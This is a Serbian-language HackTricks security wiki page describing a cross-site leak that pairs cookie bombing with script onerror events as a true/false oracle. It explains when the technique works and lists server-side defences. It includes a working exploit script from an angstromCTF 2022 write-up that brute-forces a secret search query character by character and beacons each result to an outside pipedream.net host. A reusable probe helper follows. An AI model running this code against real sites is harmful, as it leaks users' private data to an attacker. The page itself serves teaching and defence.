# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Ova tehnika kombinuje:
- Cookie bombing: punjenjem pregledača žrtve sa mnogo/velikih kolačića za ciljnu origin tako da naredni zahtevi zadiru u server/ograničenja zahteva (veličina header-a zahteva, veličina URL-a u redirect-ovima itd.).
- Error-event oracle: ispitivanjem cross-origin endpoint-a pomoću <script> (ili druge podresurse) i razlikovanjem stanja pomoću onload naspram onerror.

Glavna ideja
- Pronađite ciljni endpoint čije se ponašanje razlikuje za dva stanja koja želite testirati (npr. pretraga “hit” vs “miss”).
- Osigurajte da će “hit” put pokrenuti težak lanac redirect-ova ili dugačak URL dok će “miss” put ostati kratak. Napuhajte header-e zahteva koristeći mnogo kolačića tako da samo “hit” put uzrokuje da server zakaže sa HTTP greškom (npr. 431/414/400). Greška pokreće onerror događaj i postaје oracle za XS-Search.

Kada ovo funkcioniše
- Možete prouzrokovati da pregledač žrtve pošalje kolačiće cilju (npr. kolačići su SameSite=None ili ih možete postaviti u first-party kontekstu preko popup window.open).
- Postoji funkcija u aplikaciji koju možete zloupotrebiti da postavite proizvoljne kolačiće (npr. “save preference” endpoint-i koji pretvaraju kontrolisana imena/vrednosti inputa u Set-Cookie) ili da napravite post-auth redirect-ove koji ugrađuju podatke kontrolisane od strane napadača u URL.
- Server se drugačije ponaša u ta dva stanja i, sa napuhanim header-ima/URL-om, jedno stanje pređe limit i vrati odgovor sa greškom koji okida onerror.

Napomena o server greškama koje se koriste kao oracle
- 431 Request Header Fields Too Large se često vraća kada kolačići napuhavaju header-e zahteva; 414 URI Too Long ili server-specifičan 400 mogu se vratiti za duge request target-e. Bilo koji od ovih rezultira neuspešnim učitavanjem podresursa i pokreće onerror. [MDN dokumentuje 431 i tipične uzroke kao što su prekomerni kolačići.]()

Praktičan primer (angstromCTF 2022)
Sledeći script (iz javnog writeupa) zloupotrebljava funkciju koja napadaču omogućava da ubaci proizvoljne kolačiće, a zatim učitava cross-origin search endpoint kao script. Kada je query tačan, server izvrši redirect koji, zajedno sa naduvanim kolačićima, premaši server limite i vrati status greške, pa script.onerror bude aktiviran; u suprotnom se ništa ne dešava.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Zašto popup (window.open)?
- Moderni pretraživači sve češće blokiraju third-party cookies. Otvaranje top-level prozora prema targetu čini cookies first‑party, pa će Set-Cookie odgovori od targeta ostati važeći, omogućavajući cookie-bomb korak čak i uz ograničenja third‑party cookies.

Generički probing pomoćnik
Ako već imate način da postavite mnogo cookies na target origin (first-party), možete ponovo iskoristiti ovaj minimalni oracle protiv bilo kog endpointa čiji uspeh/neuspeh dovodi do različitih mrežnih ishoda (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Saveti za izgradnju oracle
- Naterajte “pozitivno” stanje da bude teže: lančajte dodatno preusmeravanje (redirect) samo kada je uslov tačan, ili učinite da redirect URL odražava neograničen korisnički unos tako da raste sa pogodjenim prefiksom.
- Napumpajte zaglavlja: ponavljajte cookie bombing dok se na “težem” putu ne uoči konzistentna greška. Serveri obično ograničavaju veličinu zaglavlja i zakažu ranije kada je prisutno mnogo cookies.
- Stabilizujte: pokrenite više paralelnih operacija postavljanja cookie-ja i sondirajte ponavljano kako biste izravnali šum u tajmingu i keširanju.

Povezani XS-Search trikovi
- URL length based oracles (no cookies needed) mogu se kombinovati ili koristiti umesto toga kada možete prisiliti veoma dug cilj zahteva:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Odbrane i ojačavanje
- Učinite odgovore za uspeh i neuspeh nerazlučivim:
  - Izbegavajte uslovna preusmeravanja ili velike razlike u veličini odgovora između stanja. Vraćajte isti status, isti Content-Type i sličnu dužinu tela bez obzira na stanje.
- Blokirajte cross-site subresource probe:
  - SameSite cookies: postavite osetljive cookie-je na SameSite=Lax ili Strict tako da subresource zahtevi poput <script src> ih ne šalju; po mogućstvu preferirajte Strict za auth tokene.
  - Fetch Metadata: primenite Resource Isolation Policy da odbijete cross-site subresource učitavanja (npr. ako Sec-Fetch-Site != same-origin/same-site).
  - Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (ili bar same-site) za endpoint-e koji nisu namenjeni da budu ugrađeni kao cross-origin subresources.
  - X-Content-Type-Options: nosniff i korektan Content-Type na JSON/HTML endpoint-ima da izbegnete load-as-script nepravilnosti.
- Smanjite amplifikaciju zaglavlja/URL-a:
  - Ograničite broj/veličinu postavljenih cookie-ja; sanitizujte feature-e koji pretvaraju proizvoljna polja iz formulara u Set-Cookie.
  - Normalizujte ili skratite reflektovane podatke u redirects; izbegavajte ugradnju dugačkih stringova pod kontrolom napadača u Location URL-ove.
  - Održavajte konzistentne server limite i greške koje se ponašaju uniformno (izbegavajte posebne error stranice samo za jednu granu).

Napomene
- Ova klasa napada se široko diskutuje kao “Error Events” XS-Leaks. cookie-bomb korak je samo zgodan način da se samo jedna grana gurne preko server limita, proizvodeći pouzdan boolean oracle.

## Reference
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (češće kod velikog broja cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
